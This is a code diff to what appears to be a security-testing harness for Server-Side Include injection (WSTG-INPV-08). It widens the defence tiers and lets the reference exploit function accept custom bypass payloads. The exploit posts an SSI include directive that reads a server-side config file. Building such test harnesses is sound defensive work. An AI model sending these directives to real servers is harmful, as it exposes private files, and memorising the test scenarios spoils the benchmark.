@@ -38,7 +38,7 @@ export function processSSI(content) {
 export const classDef = {
   wstgId: 'WSTG-INPV-08',
   class: 'SSI Injection',
-  defenceTiers: [0],
+  defenceTiers: [0, 1],
   Scenario,
   needsSignup: false,
   canaryRuntime: true,
@@ -66,9 +66,14 @@ export const classDef = {
     }
   },
 
-  // Reference exploit: inject an #include of the server-side config fragment.
-  async fireExploit({ baseUrl, scenario }) {
-    const body = `content=${encodeURIComponent(`<!--#include file="${FRAGMENT_PATH}"-->`)}`
+  // Reference exploit: inject an SSI directive that reads the server-side
+  // config fragment. Honours the supplied payload so T1's bypass variants
+  // (case-flipped, virtual=, whitespace-padded, etc.) flow through unchanged.
+  async fireExploit({ baseUrl, scenario, payload }) {
+    const directive = (payload && typeof payload === 'string')
+      ? payload
+      : `<!--#include file="${FRAGMENT_PATH}"-->`
+    const body = `content=${encodeURIComponent(directive)}`
     const r = await fetch(`${baseUrl}${scenario.endpoint.path}`, {
       method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body, redirect: 'manual',
     })
